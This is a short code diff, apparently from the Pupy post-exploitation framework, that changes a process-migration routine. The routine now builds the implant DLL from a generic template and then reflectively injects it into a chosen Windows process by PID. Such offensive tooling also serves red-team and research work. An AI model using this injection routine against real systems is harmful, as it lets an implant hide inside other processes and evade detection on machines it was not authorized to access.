@@ -20,10 +20,15 @@ def migrate(module, pid, keep=False, timeout=30):
     if module.client.conn.modules['pupwinutils.processes'].is_process_64(pid):
         isProcess64bits=True
         module.success("process is 64 bits")
-        dllbuff=pupygen.get_edit_pupyx64_dll(module.client.get_conf())
     else:
         module.success("process is 32 bits")
-        dllbuff=pupygen.get_edit_pupyx86_dll(module.client.get_conf())
+
+    dllbuff, filename, _ = pupygen.generate_binary_from_template(
+        module.client.get_conf(), 'windows',
+        arch=module.client.arch, shared=True
+    )
+    module.success("Template: {}".format(filename))
+
     module.success("injecting DLL in target process %s ..."%pid)
     module.client.conn.modules['pupy'].reflective_inject_dll(pid, dllbuff, isProcess64bits)
     module.success("DLL injected !")
